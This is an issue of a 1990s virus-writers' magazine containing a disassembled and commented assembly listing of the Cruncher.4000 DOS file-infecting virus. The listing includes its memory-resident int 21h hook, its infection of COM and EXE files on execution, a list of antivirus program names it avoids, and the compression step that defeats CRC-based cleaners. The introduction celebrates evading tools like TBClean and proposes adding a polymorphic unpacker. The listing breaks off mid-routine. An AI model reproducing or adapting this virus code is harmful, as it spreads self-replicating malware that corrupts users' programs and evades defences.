;
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV  1997
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € ﬂﬂﬂ€ €
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € ‹‹‹€ €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € €‹‹‹ €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹€
;          (C) Copyright, 1994-97, by STEALTH group WorldWide, unLtd.
;                             sgww@hotmail.com
;            Digest of IV 8 - 11 russian, including Moscow issues
;
;
;========================================================================
;
;        During last twenty years virus technology have  been changed
;  significantly  from simple ( Vienna-like )  viruses  which usually
;  bases  only on DOS functions  to more  sophisticated ones equipped
;  with  modern  algorithms. Here  we have disassembled and partially
;  commented   Cruncher.4000  virii.  It  uses  standard  method  for
;  allocating  memory and intercepting  21 interrupt  (4bh function).
;  But more interesting infect technique.  First virus writes  itself
;  to file  standard way and  then packs file  with LZW-algorithm. It
;  is  some kind  of vocabulary data compression. This method is also
;  implemented in well-known  DIET program.  So usual conclusion that
;  viruses waste disk space falls. This one SAVES DISK SPACE.
;        More over  this  technique  has  one more advantage. Because
;  virus changes ALL file it impossible to restore it by CRC-programs
;  like Adinf Cure Module or TBClean. ;-)
;        Although virus code wrote very carefully it must be admitted
;  some defect. Virus infects and packs separately so then to cure it
;  not so hard.  At first  unpack file by STANDARD algorithm and then
;  clear virus body.  So this method may be improved by stirring this
;  two parts (infecting, packing). And also it's possible to generate
;  polymorphic unpacker during infection.
;
;                        Disassembled and commented by IntMaster 1996
;------------------------------------------------------------------------

data_1e         equ     6
data_2e         equ     8
data_3e         equ     0Eh
data_4e         equ     10h
int21o          equ     0E0h           ; Original int 21h offset
int21s          equ     0E2h           ; Original int 21h segment
data_7e         equ     6
data_8e         equ     8
data_9e         equ     0Ah
data_10e        equ     0Ch
data_11e        equ     14h
data_12e        equ     16h
data_13e        equ     18h
data_14e        equ     0E0h
file_len1       equ     0E4h           ; File+virii length (dword)
file_len        equ     0E8h           ; File length (dword)
data_19e        equ     0ECh
data_20e        equ     0EEh
data_21e        equ     0F0h
mem_s1          equ     0F2h           ; Segment of allocated memory + 1000h
upper_b         equ     0F4h           ; Upper bound of allocated memory
data_24e        equ     0F6h
data_25e        equ     0F8h
mem_len         equ     0FAh           ; ( Number of 32 Kb blocks ) - 2

table1          equ     4000h
table2          equ     8000h
table3          equ     0C000h

;--------------------------------------------------------------------------

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h
;==========================================================================
start:                                          ; This is infected program
                jmp     real_start
                db      4000-3 dup (90h)

;==========================================================================
real_start:                                     ; Virus body begins here
                call    for_ofs
for_ofs:
                pop     si
                sub     si,3                    ; si -> real_start
                mov     di,100h
                cld                             ; Clear direction
                push    ax
                push    ds
                push    es
                push    di
                push    si                      ; Save registers

                mov     ah,30h                  ; get DOS version number
                int     21h                     ; in ax

                xchg    ah,al
                cmp     ax,30Ah
                jb      end_work                ; If version less then 3.1

                mov     ax,33E0h
                int     21h
                cmp     ah,0A5h                 ; If virii already in memory
                je      end_work                ; Then exit
                mov     ax,es
                dec     ax                      ; = Program MCB segment
                mov     ds,ax
                xor     bx,bx                   ; = 0
                cmp     byte ptr [bx],5Ah    ; Check if our MCB is last block
                                             ; ( usually it's true )
                jne     end_work             ; If not exit
                mov     ax,[bx+3]            ; = size block in paragraphs
                sub     ax,10Ah
                jc      end_work             ; If size less then 10ah
                                             ; then exit
                mov     [bx+3],ax            ; Correct block size

                sub     word ptr [bx+12h],10Ah  ; Correct upper memory bound
                                                ; in PSP
                mov     es,[bx+12h]             ; = Segment of virus
                push    cs
                pop     ds
                mov     cx,vir_len              ; Transfer virus code
                rep     movsb                   ; to the upper segment

                push    es
                pop     ds                      ; ds = es

                mov     ax,3521h             ; Get vector of 21h-interrupt
                int     21h                  ; es:bx -> int 21h handler
                mov     ds:[int21o],bx

                mov     ds:[int21s],es
                                             ; Save address of origin
                                             ; int 21h handler
                mov     dx,int_21h-real_start+100h
                mov     ax,2521h
                int     21h                  ; Set int 21h vector to ds:dx

end_work:
                pop     si
                pop     di
                pop     es
                pop     ds
                pop     ax                   ; Restore registers

                add     si,save_b-real_start
                cmp     byte ptr cs:[si],4Dh    ; 'M'
                je      exe_f                   ; Are we in exe-file now ?
                push    di                      ; di=100h
                mov     cx,18h
                rep     movsb            ; Restore 18 bytes of COM begining
                ret                      ; Exit to infected program
exe_f:
                mov     bx,ds
                add     bx,10h
                mov     cx,bx
                add     bx,cs:[si+0Eh]          ; = Stack Segment
                cli
                mov     ss,bx
                mov     sp,cs:[si+10h]          ; = Stack Offset
                sti
                add     cx,cs:[si+16h]
                push    cx                      ; = Start CS
                push    word ptr cs:[si+14h]    ; = Start IP
                retf                            ; Exit to infected program


int_24h:                                        ; Int 24h handler

                mov     al,3                    ; Use to prevent dummy
                iret                            ; DOS messages about errors


int_21h:                                        ; Int 21h handler

                pushf
                cmp     ax,33E0h                ; Virus use this function
                jne     next                    ; for detecting its presents
                mov     ax,0A502h               ; in memory
                popf
                iret
next:
                cmp     ax,33E1h                ; If call this function
                jne     next1                   ; text message'll be
                push    ds                      ; displayed
                push    cs
                pop     ds
                mov     dx,msg_v-real_start+100h ;0F5Ch
                mov     ah,9                    ; Display message from ds:dx
                int     21h
                pop     ds
                popf
                iret
next1:
                push    es
                push    ds
                push    si
                push    di
                push    dx
                push    cx
                push    bx
                push    ax
                cmp     ax,4B00h
                jne     exit
                call    infect                  ; Infect files on execution
exit:
                pop     ax
                pop     bx
                pop     cx
                pop     dx
                pop     di
                pop     si
                pop     ds
                pop     es
                popf
                jmp     dword ptr cs:[int21o]   ; Jmp to original int 21h
                                                ; handler

infect          proc    near
                cld
                push    cs
                pop     es
                mov     si,dx                   ; ds:si -> program name
                                                ; ended with 0
                xor     di,di                   ; di=0
                mov     cx,80h

loop_conv:                                      ; In this loop name of the
                lodsb                           ; executed program is
                cmp     al,0                    ; converted to upper case
                je      ex_conv
                cmp     al,61h                  ; Obtained name -> offset 0
                jb      no_small_leter          ; of es-segment
                cmp     al,7Ah
                ja      no_small_leter
                xor     al,20h
no_small_leter:
                stosb
                loop    loop_conv
exit_e:
                ret
ex_conv:
                stosb                           ; Write end zero

                lea     si,[di-5]               ; si -> name extention
                push    cs
                pop     ds

                lodsw                           ; Here we check if program
                cmp     ax,'E.'                 ; name EXE or COM
                jne     nexe_1
                lodsw
                cmp     ax,'EX'
                jmp     exe_2
nexe_1:
                cmp     ax,'C.'
                jne     exit_e
                lodsw
                cmp     ax,'MO'
exe_2:
                jne     exit_e


                push    ax
                std
                mov     cx,si
                inc     cx                      ; = length of prog. name

name_loop:                                      ; Decrease si until
                lodsb                           ; it -> prog. name
                cmp     al,':'
                je      name_exit
                cmp     al,'\'
                je      name_exit
                loop    name_loop

                dec     si

name_exit:
                pop     dx                      ; = 'EX' or 'MO'
                cld
                lodsw                           ; ax=   <second>&<third>
                lodsw                           ;       leters in prog.name

                mov     di,exe_prohib-real_start+100h
                mov     cl,12h
                cmp     dx,'EX'
                je      exe_1                   ; are we infected EXE-file?

                mov     di,com_prohib-real_start+100h
                mov     cl,3
exe_1:

                repne   scasw                   ; if second and third leters
                jz      exit_e                  ; of prog. name include in
                                                ; given  string  then
                                                ; program'll not be infected


                mov     ah,48h                  ; Obtain number of free
                mov     bx,0FFFFh               ; paragraphs in RAM
                int     21h

                and     bx,0F800h               ; Allocate all available
                mov     ah,48h                  ; blocks of 32 kB
                int     21h
                jc      exit_e

                push    ax                      ; = segment of allocated
                add     ax,bx                   ;   memory

                mov     ds:[upper_b],ax         ; = upper bound of allocated
                pop     ax                      ;   memory

                add     ah,10h
                mov     ds:[mem_s1],ax          ; = segment + 1000h

                mov     cl,0Bh
                shr     bx,cl
                sub     bl,2
                mov     ds:[mem_len],bl     ; = (number of 32 Kb blocks) - 2

                mov     ax,3300h                ; Set Ctrl-Break checking
                int     21h                     ; to OFF
                push    dx
                cwd                             ; Hi! Here you see acurate
                inc     ax                      ; programming. Using 'CWD'
                push    ax                      ; saves one byte.
                int     21h                     ; (compare with 'xor dx,dx')


                mov     ax,3524h                ; Set int 24h (error
                int     21h                     ; handling) to ours.
                push    es
                push    bx
                push    cs
                pop     ds
                mov     dx,int_24h-real_start+100h
                mov     ah,25h
                push    ax
                int     21h

                mov     ax,4300h
                cwd                             ; dx=0. So ds:dx-> prg.name
                int     21h                     ; Get file attributes in cx

                push    cx
                xor     cx,cx                   ; cx = 0
                mov     ax,4301h
                push    ax
                int     21h                ; Set all file attribtes to OFF.
                jc      exit_e1

                mov     ax,3D02h           ; Open file for read/write access
                int     21h
                jnc     open_ok

exit_e1:
                jmp     end_work5

open_ok:
                xchg    bx,ax                   ; = file handler
                mov     ax,5700h
                int     21h                     ; Take file date and time
                                                ; cx=time, dx=date
                push    dx
                push    cx
                xor     dx,dx                   ; = 0
                mov     di,file_len
                mov     [di],dx                 ; Zero file length
                mov     [di+2],dx
                mov     cx,ds:[mem_s1]

                                                ; In this loop allocated
                                                ; memory's filled with
read_loop:                                      ; file stuff
                push    cx
                mov     ds,cx                   ; In every loop
                                                ; ds:dx = ds:dx + 32 Kb
                mov     cx,8000h
                mov     ah,3Fh                  ; Read from file 32 Kb
                int     21h                     ; in ds:dx

                pop     cx
                cmp     ax,dx                   ; dx = 0
                je      end_read                ; All done ?

                add     cs:[di],ax              ; Calculate file length
                adc     cs:[di+2],dx
                add     ch,8
                dec     byte ptr cs:[mem_len]
                jnz     read_loop               ; Have we fill all memory ?

                cmp     ax,7060h                ; ???
                je      end_work0
end_read:

                mov     ds,cs:[mem_s1]
                xor     si,si                   ; = 0
                push    cs
                pop     es
                mov     di,save_b-real_start+100h
                mov     cx,18h                  ; Save first 18h byte
                rep     movsb                   ; of infected program

                xor     si,si
                push    ds
                pop     es
                cmp     word ptr [si],5A4Dh    ; Check if we infect EXE-file
                je      exe_infect

                call    com_chk                ; Check stuff of COM-file

                jc      end_work0

                mov     ah,3Eh
                int     21h                     ; Close file

                xor     di,di                   ; Set first 3 byte of
                mov     al,0E9h                 ; file - JMP < virii code >
                stosb
                mov     ax,cs:[file_len]
                sub     ax,3
                stosw

                call    add_vir

                push    cs
                pop     ds

                mov     ah,3Ch
                xor     dx,dx                   ; ds:dx -> file name
                mov     cx,20h                  ; = attributes
                int     21h                     ; Create file, ax = handler

                jc      end_work5
                xchg    bx,ax
                call    com_inf
end_work0:
                jmp     short end_work3
                nop
exe_infect:
                call    exe_chk                 ; Check stuff of EXE-file
                jc      end_work0

                mov     ah,3Eh
                int     21h                     ; Close file

                call    f_len                   ; dx:ax = file length
                mov     cx,10h
                div     cx
                sub     ax,[si+8]  ; ax = (file length) - (header length) - 1
                dec     ax         ; in paragraphs
                add     dx,10h
                mov     [si+16h],ax             ; correct startup CS
                mov     [si+0Eh],ax             ; correct startup SS
                mov     [si+14h],dx             ; correct startup IP
                mov     word ptr [si+10h],1000h ; correct startup SP
                call    f_len                   ; dx:ax = file length
                add     ax,vir_len
                adc     dx,0                    ; dx:ax = file + virus lenght
                call    div512
                mov     [si+4],ax               ; file length in 512 blocks
                mov     [si+2],dx               ; length of the last block
                call    add_vir                 ; Write virus body to the end
                                                ; of the file

                call    ofs_work
                jnc     end_work2
                pop     cx                      ; Take from stack
                pop     dx                      ; file time and date
                jmp     short end_work4
end_work2:
                push    cs
                pop     ds
                mov     ah,3Ch
                xor     dx,dx                   ; ds:dx -> file name
                mov     cx,20h                  ; = attributes
                int     21h                     ; Create file, ax = handler

                jc      end_work5
                xchg    bx,ax

                call    exe_inf

end_work3:
                pop     cx
                pop     dx
                mov     ax,5701h                ; Set file time and date
                int     21h

end_work4:
                mov     ah,3Eh                  ; Close file after infection
                int     21h

end_work5:
                pop     ax                      ; = 4301h
                pop     cx                      ; = original file attribs
                cwd                             ; = 0 -> prog. name
                int     21h                     ; Restore file attributes

                pop     ax                      ; = 2524h
                pop     dx                      ;\_ Original int 24h
                pop     ds                      ;/  handler
                int     21h                     ; Restore 24h vector

                pop     ax                      ; = 3301h
                pop     dx                      ; = Ctrl+Break state
                int     21h                     ; Restore Ctrl+Break state

                mov     ax,cs:[mem_s1]
                sub     ah,10h
                mov     es,ax
                mov     ah,49h                  ; Return memory used
                int     21h                     ; during infection

                ret
infect          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Add virus body to the file in memory
;==========================================================================

add_vir         proc    near
                push    ds
                push    si
                push    cs
                pop     ds
                call    pcount                  ; es:di -> end of the file
                                                ;          in memory

                                                ; Add virus body to file
                mov     si,100h
                mov     cx,vir_len
                rep     movsb

                                                ; Adjust file length
                add     word ptr ds:[file_len],vir_len
                adc     word ptr ds:[file_len+2],0

                mov     ax,ds:[file_len]        ; dx:ax = file length
                mov     dx,ds:[file_len+2]

                mov     ds:[file_len1],ax       ; Save file+virus length
                mov     ds:[file_len1+2],dx

                pop     si
                pop     ds
                ret
add_vir         endp


                ; This strings are used as mark to prevent
                ; some programs
com_prohib      db      'CO    '
exe_prohib      db      'SCCLVSNEHTTBVIFIGIRAFEMTBRIM        '

;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Divide by 512
;--------------------------------------------------------------------------
;  BEFORE CALL:     ax = number
;
;  RETURNS:         ax = (ax+511)/512
;==========================================================================

div512          proc    near
                mov     cx,200h
                div     cx
                or      dx,dx
                jz      dd1
                inc     ax
dd1:
                ret
div512          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;  RETURNS:         dx:ax = file length
;==========================================================================

f_len           proc    near
                mov     ax,cs:[file_len]
                mov     dx,cs:[file_len+2]
                ret
f_len           endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Count data address
;--------------------------------------------------------------------------
;  RETURN:          es:di -> end of the file data
;==========================================================================

pcount          proc    near
                call    f_len

                ; If offset(in file) puts in dx:ax
                ; Then return offset(in memory) in es:di
pcount1:
                call    div10
                add     ax,cs:[mem_s1]
                mov     es,ax
                mov     di,dx
                ret
pcount          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Used during COM-file infection
;--------------------------------------------------------------------------
;  BEFORE CALL:     si = 0
;                   ds - segment of file stuff
;
;  RETURN:          Set carry flag, if not infected
;                   Clear carry flag, if infected
;==========================================================================

com_chk         proc    near
                cmp     word ptr [si+3],0FC3Bh  ; If in file
                                                ;     word ptr [3] = 0fc3bh
                                                ;  or byte ptr [0] = 80h
                je      end_work7               ; Then don't infect.
                test    byte ptr [si],80h
                jz      end_work7

                call    f_len                   ; dx:ax = file length

                cmp     ah,0D0h                 ; Check restriction
                jae     end_work7               ; on file length
                cmp     ah,1                    ; ( 256b < length < 52 Kb )
                jb      end_work7

                clc                             ; Clear carry flag
                ret
end_work7:
                stc                             ; Set carry flag
                ret
com_chk         endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Used during EXE-file infection
;--------------------------------------------------------------------------
;  BEFORE CALL:     si = 0
;                   ds - segment of file stuff
;
;  RETURN:          Set carry flag, if infected
;                   Clear carry flag, if not infected
;==========================================================================

exe_chk         proc    near
                cmp     word ptr [si+23h],6FCh
                je      not_inf
                cmp     word ptr [si+18h],40h
                jb      end_work8
                mov     ax,3Ch
                cwd
                call    pcount1              ; es:di -> 3Ch'th byte in file
                mov     ax,es:[di]           ; ( offset table )
                mov     dx,es:[di+2]

                call    pcount1
                cmp     byte ptr es:[di+1],45h  ; 'E'
                je      not_inf

end_work8:
                call    f_len
                call    div512
                cmp     [si+4],ax               ; Check if EXE-file
                jne     not_inf                 ; segmentated
                cmp     [si+2],dx
                jne     not_inf

                cmp     [si+0Ch],si             ; Check Maxmem and
                je      not_inf                 ; Minmem in EXE-header
                cmp     [si+1Ah],si
                jne     not_inf

                cmp     word ptr [si+8],0F80h   ; Check header length
                ja      not_inf
                cmp     word ptr [si+8],2
                jb      not_inf

                clc                           ; Clear carry flag
                ret                           ; CF=0 so then we can infect
not_inf:
                stc                           ; Set carry flag
                ret                           ; CF=1 so then we can't infect
exe_chk         endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Use during EXE-file infection
;                   For reallocate offset table
;==========================================================================

ofs_work        proc    near
                mov     ax,[si+4]               ; File length in 512 blocks
                mov     cx,5
                shl     ax,cl
                sub     ax,[si+8]
                mov     cs:[data_21e],ax        ; file - header length
                mov     ax,cs:[file_len1]
                mov     dx,cs:[file_len1+2]
                call    pcount1
                add     ax,[si+8]               ; Check if file body
                add     ax,2                    ; can be read in memory
                cmp     ax,cs:[upper_b]
                jb      enough_mem

                stc                             ; Set carry flag
                ret
enough_mem:
                mov     ax,[si+8]
                push    di
                push    di
                push    si
                mov     cx,3
                shl     ax,cl
                mov     cx,ax                   ; Header length in words
                rep     movsw                   ; Move header
                mov     dx,di
                pop     si
                pop     di
                push    dx
                mov     cx,[si+6]               ; = number of elements
                jcxz    empty_tbl               ;   in offset table

                add     di,[si+18h]             ; -> offset table
                add     si,[si+18h]             ; -> offset table
                push    di
                push    si
                push    cx
                xor     ax,ax                   ; = 0
                shl     cx,1
                rep     stosw                   ; Clear offset table

                pop     cx
                pop     si
                pop     di
                mov     bp,0FFFFh

tbl_loop:                                       ; Work with offset
                lodsw                           ; table in EXE-file
                mov     dx,ax
                lodsw
                or      ax,ax
                js      exit_10
                cmp     ax,bp
                jne     loc_33
                mov     ax,dx
                sub     ax,bx
                test    ah,0C0h
                jnp     loc_32
                or      ah,80h
                jmp     short loc_34
loc_32:
                mov     ax,[si-2]
loc_33:
                stosw
                mov     bp,ax
                mov     ax,dx
loc_34:
                mov     bx,dx
                stosw
                loop    tbl_loop

empty_tbl:
                pop     dx
                pop     si
                mov     cx,di
                xor     ax,ax                   ; = 0
loc_36:
                cmp     di,dx
                jae     loc_37
                scasb
                jz      loc_36
                mov     cx,di
                jmp     short loc_36
loc_37:
                sub     cx,si
                push    es
                pop     ds
                push    si
                push    cx
                xor     ax,ax                   ; = 0

locloop_38:
                xor     ah,[si]
                inc     si
                loop    locloop_38
                and     ah,0FEh
                pop     cx
                pop     si
                add     [si+2],ax
                mov     ax,cx
                xor     dx,dx                   ; = 0
                add     cs:[file_len],ax
                adc     cs:[file_len+2],dx
                mov     ax,[si+8]
                mov     cx,4
                shl     ax,cl
                sub     cs:[file_len],ax
                sbb     cs:[file_len+2],dx
                clc                             ; Clear carry flag
                ret
exit_10:
                stc                             ; Set carry flag
                ret
ofs_work        endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Use in COM-file infection
;                   Add virus body to file
;==========================================================================

com_inf         proc    near

                mov     ah,40h                  ; Write to infected file
                mov     cx,unp_len              ; at begin unpacking code

                mov     dx,unp_code-real_start+100h
                int     21h

                push    bx                      ; Save file handler
                mov     ax,ds:[mem_s1]
                mov     ds,ax                   ; = file data segment
                sub     ah,10h
                mov     es,ax                   ; -> @(ds - 64 Kb)
                mov     cl,1

                call    pack

                push    cs
                push    cs
                pop     ds
                pop     es
                mov     ds:[data_59-real_start+100h],bx
                mov     ds:[data_19e],ax
                mov     ds:[data_20e],dx

                pop     bx                      ; = file handle

                call    sub_13

                mov     ah,40h
                mov     cx,sub_18end-sub_18
                mov     dx,sub_18-real_start+100h
                int     21h



                mov     ah,40h
                mov     cx,z_reg_len
                mov     dx,z_reg-real_start+100h
                int     21h



                mov     ax,4200h                ; Set file pointer at the
                xor     cx,cx                   ; begin
                cwd
                int     21h


                mov     ah,40h                  ; Write 25h in the infecting
                mov     cx,25h                  ; file

                mov     dx,unp_code-real_start+100h
                int     21h

                ret
com_inf         endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

exe_inf         proc    near
                mov     ah,40h
                mov     cx,5Ah
                mov     dx,846h
                int     21h                 ; DOS Services  ah=function 40h
                                            ;  write file  bx=file handle
                                            ;   cx=bytes from ds:dx buffer
                push    bx
                mov     ax,ds:[mem_s1]
                mov     ds,ax
                sub     ah,10h
                mov     es,ax
                cmp     word ptr cs:[file_len+2],0
                jl      loc_41                  ; Jump if <
                jg      loc_40                  ; Jump if >
                cmp     word ptr cs:[file_len],0FC00h
                jbe     loc_41                  ; Jump if below or =
loc_40:
                xor     ax,ax                   ; Zero register
                jmp     short loc_42
loc_41:
                mov     ax,1
loc_42:
                mov     cs:[data_25e],ax
                mov     cx,ax
                mov     ax,ds
                xor     si,si                   ; Zero register
                add     ax,[si+8]
                mov     ds,ax
                call    pack
                push    cs
                pop     ds
                mov     es,ds:[mem_s1]
                mov      ds:[data_45-real_start+100h],bx
                mov     ds:[data_19e],ax
                mov     ds:[data_20e],dx
                pop     bx
                call    sub_14
                push    cs
                pop     es
                mov     cx,94h
                cmp     word ptr ds:[data_25e],0
                jne     loc_43               ; Jump if not equal
                mov     cx,0C0h
loc_43:
                mov     ah,40h
                mov     dx,8C5h
                int     21h                  ; DOS Services  ah=function 40h
                                             ;  write file  bx=file handle
                                             ;   cx=bytes from ds:dx buffer
                mov     ax,ds:[data_24e]
                cmp     al,2
                je      loc_45               ; Jump if equal
                cmp     al,1
                je      loc_44               ; Jump if equal
                mov     cx,35h
                mov     dx,994h
                jmp     short loc_46
loc_44:
                mov     cx,3Eh
                mov     dx,9C9h
                jmp     short loc_46
loc_45:
                mov     cx,1Dh
                mov     dx,0A07h
loc_46:
                mov     ah,40h
                int     21h                  ; DOS Services  ah=function 40h
                                             ;  write file  bx=file handle
                                             ;   cx=bytes from ds:dx buffer
                mov     ax,4200h
                xor     cx,cx                ; Zero register
                cwd                          ; Word to double word
                int     21h                  ; DOS Services  ah=function 42h
                                             ;  move file ptr, bx=file handle
                                             ;   al=method, cx,dx=offset
                mov     ah,40h
                mov     cx,5Ah
                mov     dx,846h
                int     21h                  ; DOS Services  ah=function 40h
                                             ;  write file  bx=file handle
                                             ;   cx=bytes from ds:dx buffer
                ret
exe_inf         endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_13          proc    near
                mov     ax,ds:[data_19e]
                add     ax,0C4h
                shr     ax,1                    ; Shift w/zeros fill
                mov     ds:[data_57-real_start+100h],ax
                shl     ax,1                    ; Shift w/zeros fill
                add     ax,123h
                mov     ds:[data_56-real_start+100h],ax
                add     ax,ds:[file_len]
                sub     ax,ds:[data_19e]
                add     ax,3DBh
                mov     ds:[data_55-real_start+100h],ax
                mov     ax,ds:[file_len]
                add     ax,456h
                mov     ds:[data_58-real_start+100h],ax
                add     ax,4Dh
                neg     ax
                mov     ds:[data_60-real_start+100h],ax
                ret
sub_13          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_14          proc    near
                push    bx
                mov     ax,3Ah
                xor     dx,dx                   ; Zero register
                add     ax,ds:[data_19e]
                adc     dx,ds:[data_20e]
                call    div10
                add     ax,18h
                mov     ds:[data_51-real_start+100h],ax
                push    dx
                call    f_len
                call    sub_17
                add     ax,58h
                mov     si,ax
                sub     ax, ds:[data_51-real_start+100h]
                mov     ds:[data_52-real_start+100h],ax
                cmp     ax,10h
                jae     loc_47                  ; Jump if above or =
                mov     word ptr ds:[data_52-real_start+100h],10h
                mov     si, ds:[data_51-real_start+100h]
                add     si,ax
loc_47:
                mov     ax,ds:[file_len1]
                mov     dx,ds:[file_len1+2]
                call    sub_17
                sub     ax,es:[data_2e]
                mov     ds:[data_54-real_start+100h],ax
                neg     ax
                add     ax,si
                mov     cx,4
                shl     ax,cl                   ; Shift w/zeros fill
                pop     dx
                add     ax,dx
                sub     ax,107h
                mov     ds:[data_53-real_start+100h],ax
                cmp     word ptr es:[data_1e],0
                je      loc_49                  ; Jump if equal
                mov     ax,es:[data_4e]
                mov     cx,4
                shr     ax,cl                   ; Shift w/zeros fill
                add     ax,es:[data_3e]
                mov     dx,si
                add     dx,8
                cmp     ax,dx
                jbe     loc_48                  ; Jump if below or =
                mov     word ptr ds:[data_24e],0
                mov     ax,es:[data_3e]
                mov     ds:[data_43-real_start+100h],ax
                mov     ax,es:[data_4e]
                mov     ds:[data_44-real_start+100h],ax
                jmp     short loc_51
loc_48:
                mov     word ptr ds:[data_24e],1
                jmp     short loc_50
loc_49:
                mov     word ptr ds:[data_24e],2
loc_50:
                mov     ds:[data_43-real_start+100h],si
                mov     word ptr ds:[data_44-real_start+100h],80h
                mov     ax,es:[data_3e]
                mov     ds:[data_67-real_start+100h],ax
                mov     ds:[data_71-real_start+100h],ax
                mov     ax,es:[data_4e]
                mov     ds:[data_68-real_start+100h],ax
                mov     ds:[data_72-real_start+100h],ax
loc_51:
                mov     ax,94h
                cmp     word ptr ds:[data_25e],0
                jne     loc_52                  ; Jump if not equal
                mov     ax,0C0h
loc_52:
                xchg    dx,ax
                mov     ax,ds:[data_24e]
                mov     bx,82Eh
                xlat                            ; al=[al+[bx]] table
                add     ax,dx
                add     ax,5Ah
                xor     dx,dx                   ; Zero register
                add     ax,ds:[data_19e]
                adc     dx,ds:[data_20e]
                push    ax
                push    dx
                push    ax
                push    dx
                push    ax
                add     ax,1FFh
                adc     dx,0
                call    sub_16
                mov     ds:[data_40-real_start+100h],ax
                pop     ax
                and     ax,1FFh
                mov     ds:[data_39-real_start+100h],ax
                pop     dx
                pop     ax
                add     ax,0FFEFh
;*              adc     dx,0FFFFh
                db      83h,0D2h,0FFh          ;  Fixup - byte match
                call    sub_17
                xchg    dx,ax
                mov     di,ds:[data_21e]
                add     di,es:[data_9e]
                mov     ax,si
                add     ax,8
                cmp     ax,di
                ja      loc_53                  ; Jump if above
                mov     ax,di
loc_53:
                sub     ax,dx
                mov     ds:[data_41-real_start+100h],ax
                mov     word ptr ds:[data_42-real_start+100h],0FFFFh
;*              cmp     word ptr es:[data_10e],0FFFFh
                db      26h, 83h, 3Eh, 0Ch, 00h,0FFh ;  Fixup - byte match
                jz      loc_55                  ; Jump if zero
                mov     di,ds:[data_21e]
                add     di,es:[data_10e]
                mov     ax,si
                add     ax,8
                cmp     ax,di
                ja      loc_54                  ; Jump if above
                mov     ax,di
loc_54:
                sub     ax,dx
                mov      ds:[data_42-real_start+100h],ax
loc_55:
                mov     ax,es:[data_11e]
                mov     ds:[data_63-real_start+100h],ax
                mov     ds:[data_69-real_start+100h],ax
                mov     ds:[data_73-real_start+100h],ax
                mov     ax,es:[data_12e]
                mov     ds:[data_64-real_start+100h],ax
                mov     ds:[data_70-real_start+100h],ax
                mov     ds:[data_74-real_start+100h],ax
                pop     dx
                pop     ax
                add     ax,0FFDEh
;*              adc     dx,0FFFFh
                db      83h,0D2h,0FFh          ;  Fixup - byte match
                call    div10
                mov     ds:[data_48-real_start+100h],ax
                mov     ds:[data_47-real_start+100h],dx
                mov     ax,ds:[file_len1]
                and     ax,0Fh
                add     ax,es:[data_13e]
                mov     ds:[data_61-real_start+100h],ax
                mov     ds:[data_65-real_start+100h],ax
                mov     ax,es:[data_7e]
                mov     ds:[data_62-real_start+100h],ax
                mov     ds:[data_66-real_start+100h],ax
                mov     ax,ds:[data_19e]
                mov     dx,ds:[data_20e]
                mov     ds:[data_49-real_start+100h],ax
                mov     byte ptr ds:[data_50-real_start+100h],dl
                mov     ax,es:[data_8e]
                mov     ds:[data_46-real_start+100h],ax
                pop     bx
                ret
sub_14          endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================
;                   Division by 10h
;--------------------------------------------------------------------------
;  BEFORE CALL:     dx:ax - number
;
;  RETURN:          ax = (dx:ax)/10h
;                   dx = reminder
;==========================================================================

div10           proc    near
                mov     cx,10h
                div     cx
                ret
div10           endp


;==========================================================================
;                              SUBROUTINE
;==========================================================================

sub_16          proc    near
                mov     cx,9
                jmp     short loc_56

sub_17:
                mov     cx,4
loc_56:
                dec     cx
                jl      loc_ret_57
                sar     dx,1
                rcr     ax,1
                jmp     short loc_56

loc_ret_57:
                ret
sub_16          endp


                xor     ax,1D3Eh

save_hand       dw      0                       ; Savege for file handler
data_29         dw      0
save_ss         dw      0                       ; Savage for SS
save_sp         dw      0                       ; Savage for SP
file_len3       dw      0                       ; Savage for file length
                dw      0
data_34         dw      0
data_35         dw      0
data_36         dw      0
data_37         dw      0
switch          db      01h, 4Dh, 5Ah
data_39         dw      0
data_40         dw      0
                db      01h, 00h, 02h, 00h

data_41         dw      0
data_42         dw      0FFFFh
data_43         dw      0
data_44         dw      0
data_45         dw      0

                db      03h,00h,00h,00h,1Ch,0
data_46         dw      0
                org     $-2
data_78         dw      0                   ; Data table (indexed access)
data_47         dw      0
data_48         dw      0
data_49         dw      0
data_50         db      0

                db      0FCh, 06h, 1Eh, 0Eh, 8Ch,0C8h
                db      01h, 06h, 38h, 01h,0BAh
data_51         dw      0
                db      03h,0C2h, 8Bh,0D8h, 05h
data_52         dw      0

loc_58:
                mov     ds,bx
                mov     es,ax
                xor     si,si
                xor     di,di
                mov     cx,8
                rep     movsw
                dec     bx
                dec     ax

                dec     dx
                jns     loc_58
                mov     es,bx
                mov     ds,ax
